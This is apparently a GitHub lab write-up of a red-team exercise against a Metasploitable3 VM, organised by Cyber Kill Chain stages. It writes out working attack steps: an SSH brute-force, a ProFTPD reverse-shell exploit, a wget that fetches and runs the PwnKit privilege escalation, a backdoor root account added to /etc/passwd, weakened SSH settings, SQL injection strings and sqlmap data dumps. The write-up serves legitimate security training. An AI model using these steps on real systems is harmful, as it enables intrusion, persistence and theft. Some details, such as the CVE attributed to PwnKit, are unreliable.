# Cyber-Kill-Chain

## Objective

The objective of the “Cyber Kill Chain” project is to deepen my understanding of penetration testing through hands-on experience and the application of the Cyber Kill Chain to a real-world scenario. By simulating a red team attack on a Metasploitable server, I aim to enhance my skills in identifying vulnerabilities, executing exploits, and navigating the complexities of trial and error until achieving success. This project underscores the symbiotic relationship between red team and blue team operations, emphasizing that proficiency in one necessitates a comprehensive understanding of the other.

### Skills Learned

- Gained a deeper understanding of Nmap: Identified network ranges, open ports and services
- Hands-on experience with identifying potential vulnerabilities and executing exploits
- Learned techniques for escalating privileges on compromised systems
- Furthered my experience in Metasploit executing exploits and reverse-shells
- Used John the Ripper, Hydra and Hashcat for password/hash cracking
- Established reverse shells and executed commands on compromised systems including file manipulation
- Used SSH to achieve persistent control of a target's system
- Enhanced problem-solving abilities and research skills
- Applied the Cyber Kill Chain to a real world scenario

### Tools Used

- VirtualBox - A Virtualization software that allows users to create and run virtual machines
- Kali Linux - A Debian-based linux distribution designed for forensic, penetration testing and security research
- Nmap - A network scanning tool used to discover hosts and services on a computer network. It provides information about open ports, running services and their versions
- Metasploit Framework - An open-source penetration testing framework that helps find, exploit and validate vulnerabilities.
- John the Ripper - A password cracking tool that supports various password hash types
- Metasploitable3 - A virtual machine built with a large amount of security vulnerabilities
- Hydra - A password cracking tool used for various services
- Hashcat - A hashed passwords cracking tool that supports various hashes
- SQLMap - An open-source penetration tool that automates the process of detecting and exploiting SQL injection flaws and enumerates data
- Netcat - A network utility for reading from and writing to network connections using TCP and UDP

### Proposed Hardening

- Update and patch all software and services to mitigate known vulnerabilities
- Access controls to restrict access to network scanning tools and monitor for unauthorized use
- Vulnerability scan endpoints to identify and remediate current weaknesses
- Encrypt data at rest and in transfit to promote confidentiality
- Least privilege to limit user access to only what is necessary 
  
## Steps

### Reconnaissance
- To find my IP address
  ```bash
  ip a s
  ```
  ![ip a s](https://github.com/user-attachments/assets/dc35ee6c-cd5b-40b6-9c1b-9a0d2a8bc2f5)

- The IP and subnet range found is 10.0.2.0/24
- Pinged the network to see which hosts were active:
  
  ```bash
  nmap -sn 10.0.2.0/24
  ```
  
  ![nmap -sn](https://github.com/user-attachments/assets/d7dec4e2-fb39-48ed-9f9d-6137bcdcd1fe)

- To gather information on the active hosts on the network:
  
  ```bash
  nmap -sV 10.0.2.6 -p 0-65535
  ```

  ![nmap -sV](https://github.com/user-attachments/assets/f65cd838-709c-40d0-95fe-2a347c6db6d7)

- The nmap -sV scan provided the evidence needed to pinpoint Metasploitable3 to 10.0.2.6
- To gather more information, an aggressive scan was ran:
  
  ```bash
  nmap -A 10.0.2.6
  ```

  ![nmap -A 1](https://github.com/user-attachments/assets/01f9b707-99a4-4426-8523-bedbf800c43b)
  ![nmap -A 2](https://github.com/user-attachments/assets/a6c3ab26-ce48-49c5-8fbc-fa3cce581cb4)

- A user enumeration was ran on port 445:

  ```bash
  nmap --script smb-enum-users -p 445 10.0.2.6
  ```

  ![Chewbacca p445](https://github.com/user-attachments/assets/540ceaa0-4e1c-4572-99da-ec6d5b04d6b4)

- The nmap scanned provided a username: Chewbacca
- While exploring for another vulnerability, an SSH brute-force was attempted on the user
- To attempt an SSH brute-force, the following was ran in Metasploit:
  
  ```bash
  msfconsole 
  use auxiliary/scanner/ssh/ssh_login
  set rhosts 10.0.2.6
  set username chewbacca
  set pass_file /user/share/wordlists/rockyou.txt
  set verbose true
  set threads 16
  set stop_on_success true
  run
  ```

  ![bruteforce](https://github.com/user-attachments/assets/bb4b9796-74c7-4b06-8174-f4e255a3ba34)

### Weaponization, Delivery, Exploitation

- A search was ran in Metasploit on ProFTPD to investigate potential exploits:

  ![proftpd search](https://github.com/user-attachments/assets/23139e70-6b78-4b2e-943a-8679bad7abde)

- Exploit-DB was used to cross-reference the exploits associated with ProFTPD in Metasploit:

  ![exploit-db](https://github.com/user-attachments/assets/1d7ff8cd-2f78-46ae-98e9-008be36401d5)

- To use the modcopy ProFTPD exploit, the following was used in Metasploit:

  ```bash
  use exploit/unix/ftp/proftpd_modcopy_exec
  set rhosts 10.0.2.6
  set sitepath /var/www/html
  set payload cmd/unix/reverse_perl
  set lhost 10.0.2.5
  run
  ```
  
- After the payload was sent, a successful reverse shell connection was executed:

  ![Protdp exploit](https://github.com/user-attachments/assets/fcd7c6b2-190e-4f3b-ac91-72c49feb8096)

- Once the connection to the target host was successful, the directory was changed to /etc to move into the password and shadow file directory
  
  ```bash
  cd /etc

- To collect information on the users in the system:
  
  ```bash
  cat /etc/passwd
  ```

  ![passwd](https://github.com/user-attachments/assets/ca56921b-4052-4737-b17d-8f515950fbff)

- After the contents from the passwd file were collected, I attempted to access the contents in the shadow file with:

  ```bash
  cat /etc/shadow
  sudo cat /etc/shadow
  ```
  
- The user account that was accessed did not have permissions to view the /etc/shadow file nor any sudo privileges after attempting 'sudo -l'
- To discover which user is being used:
  
  ```bash
  whoami
  ```

- To access the shadow file, I needed access to the server with appropriate permissions, the following command was ran:

  ```bash
  find / -perm -4000 -type f 2>/dev/null
  ```
  - find / - starts the search for files and directories from the top of the directory and down
  - -perm - specifies the search to files with specific permissions
  - -4000 - identifies files with the setuid bit set. (If a regular user executes the file, it runs with the privileges of the file's owner, often root. Helps to identify security flaws)
  - 2>/dev/null - redirects the the error messages to not display in the terminal
 
  ![noshadownosudo](https://github.com/user-attachments/assets/d27c2375-dd93-474b-b036-57a8f17f5c5e)

### Installation

- Pkexec allows an authorized user to execute a program as another user, the version number was checked and identified as pkexec version 0.105
- Exploit-DB was checked for exploits associated with pkexec version 0.105 and the following was found:
  - https://www.exploit-db.com/exploits/50011
  - This exploit, identified as CVE-2021-3560, allows a local attacker to gain elevated privileges by creating a new user with administrative rights and setting its password
- To download the exploit directly into the target host:

  ```bash
  wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh -O /tmp/PwnKit.sh
  ```

- To check if the download was successful, the directory was changed to /tmp and listed the files in the directory
  
  ```bash
  cd /tmp
  ls -l
  ```

  ![pkexecdownload](https://github.com/user-attachments/assets/bf574cf4-09a3-4884-9c28-d1c10e7a087b)

- To run the exploit, I had to be in the /tmp directory and run:
  
  ```bash
  ./PwnKit.sh"
  ```

  ![pwnkit exploit](https://github.com/user-attachments/assets/f29688a9-1a02-4346-84e0-5514df0c43bf)

- whoami? Root.
- Now that I have root privileges, I wanted to add a new user with root privileges so that I can obtain persisent control and complete the command and control stage
- I generated a hashed password with openssl on my host machine:

  ```bash
  openssl passwd -1 -salt xyz password
  ```
  
- On the target machine, in the reverse shell, I ran the following command to add a new user to /etc/passwd with root privileges
  ```bash
  
  echo 'hacker:$1$xyz$cEUv8aN9ehjhMXG/kSFnM1:0:0:Hacker:/root:/bin/bash' >> /etc/passwd
  ```
  
- The newly created account was not only able to access the /etc/shadow file, but had root access to the entire system

  ![root access](https://github.com/user-attachments/assets/52210765-64ed-4c38-a8da-b9fe24a7b357)

- Now it was time to setup SSH
- I went into the /etc/ssh/sshd_config file to check if it was configured correctly
- After opening the configuration file I noticed that PasswordAuthentication was commented out and used the following to uncomment it:

  ```bash
  sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication yes/' /etc/ssh/sshd_config
  ```
  
  ![pwauth](https://github.com/user-attachments/assets/dddd36c1-d176-4b38-bcd5-5ce6b5151342)

  ![pwauth2](https://github.com/user-attachments/assets/dff79ae1-e0a2-4c84-aa67-0256436cc054)

- Once the configuration file was changed, I restarted the SSH service with:
  ```bash
  service ssh restart
  ```

- On my attacking machine, I ran:
  ```bash
  ssh hacker@10.0.2.6
  ```

- Permission Denied.
- I continued to look at the sshd_config file and debated whether or not I had to add a public key to the system... and then I noticed
- whoami? I am root
- If you look at the screenshot below 'PermitRootLogin' is set to 'without-password' which means I would have to login with key authentication:

  ![permitroot1](https://github.com/user-attachments/assets/09f301dd-bd77-4329-bef2-84f1bec61cf4)

- I switched PermitRootLogin from without-password to yes which would allow me to login with a password:

  ```bash
  sed -i 's/^PermitRootLogin without-password/PermitRootLogin yes/' /etc/ssh/sshd_config
  ```

  ![permitroot2](https://github.com/user-attachments/assets/a6a39404-662f-4df8-baa2-68217c55f128)


### Command and Control
 
- It was now time to achieve persistent control
- I opened a terminal on my attacking host:

  ```bash
  ssh hacker@10.0.2.6
  ```

  ![ssh](https://github.com/user-attachments/assets/14e4c16e-d7ea-46c6-9bb1-37f6bb849d5a)


### Actions on Objectives
  
- After gaining persistent control, I went into /var/www/html and deleted the .php file and the PwnKit exploit to minimize threat actor presence

  ![php pwnkit del](https://github.com/user-attachments/assets/c5cc357a-0540-46b3-9a80-e1ff46dd01d1)

- The investigation for confidential documents commenced
- The first documents I found:

  ![flag 1 p1](https://github.com/user-attachments/assets/b5260f8a-a7cf-4c63-b4f1-ab2763ed7926)

- Once I found the first document, I used the secure copy protocol to transfer the document onto my local host:
  
  ```bash
  scp hacker@10.0.2.6:/lost+found/3_of_hearts.png /home/ant/Downloads/
  ```

  ![flag 1 p2](https://github.com/user-attachments/assets/9764f36f-e89a-4c9a-9cf7-374fae076d9b)

  <img src="https://github.com/user-attachments/assets/d6348533-5861-4fa8-a4bd-58e747a24800" alt="flag 1 p3" height="400"/>

- Document number 2:
  
  ![chrome_C0q16Sqxf6](https://github.com/user-attachments/assets/3711ef59-ef84-42e2-8b7c-9dc902a452ff)

  <img src="https://github.com/user-attachments/assets/4d98dc68-2f8e-4edf-93b9-d7baa3744341" alt="chrome_zP7yjo6Ozh" height="400"/>


- To find document 3, I used the 'find' command in the root directory / and * as a wildcard:

  ```bash
  find / -name *spades.png
  ```
  ![flag 3 p1](https://github.com/user-attachments/assets/46164cce-c843-4bda-8dca-2ef8d4a8d6a8)

  ![flag 3 p2](https://github.com/user-attachments/assets/c32ae5fc-cfc0-4f8d-8fc6-935a61525894)

  <img src="https://github.com/user-attachments/assets/fdae9604-da2b-4bd4-a2b9-462b6f80a981" alt="flag 3 p3" height="400"/>


CTF (to be continued...)


### Additional Investigations

- I wanted to dive deeper into this project to discover additional vulnerabilities for potential exploits and information gathering
- After further investigation, I noticed the HTTP and MySQL servers were open
- I went to the host's address 10.0.2.6 and discovered:
  
  <img src="https://github.com/user-attachments/assets/2639ff29-4cff-48da-8a5a-0ee892aec7b7" alt="HTTP Server" height="400"/>

- At first, I attempted some SQL Injections such as:
  
  ```sql
  -- or # 
  ' OR '1
  ' OR 1 -- -
  " OR "" = "
  " OR 1 = 1 -- -
  ' OR '' = '
  ```

- I noticed with a few injections, I was able to discover a few column names
- To enumerate more information, I used SQLMap and ran the following command:
  
  ```bash
  sqlmap -u http://10.0.2.6/payroll_app.php --data="user=admin&password=admin&s=OK" -p user --method POST --columns
  ```

  ![sqlmap1](https://github.com/user-attachments/assets/4cd656a1-2f63-4fc9-bfd4-ed1ee010f4fe)

- The output:

  ![sqlmap2](https://github.com/user-attachments/assets/013167d7-8fc6-4048-a3b5-f4c605e3a2f3)

- Now that I knew the column names, I wanted to enumerate the actual information within the columns
- In SQLMap, I ran:
  
  ```bash
  sqlmap -u "http://10.0.2.6/payroll_app.php" --data="user=admin&password=admin&=OK" -p user --method POST payrol -T users --dump
  ```

  ![sqlpmap3](https://github.com/user-attachments/assets/3ef893b9-12a2-46cc-bbc2-aa43e797eba7)

- The output was exactly what I have been looking for.. Chewbacca's password:

  ![sqlmap4](https://github.com/user-attachments/assets/3ba2a9da-b1ec-42f0-8822-3c3b742c5170)






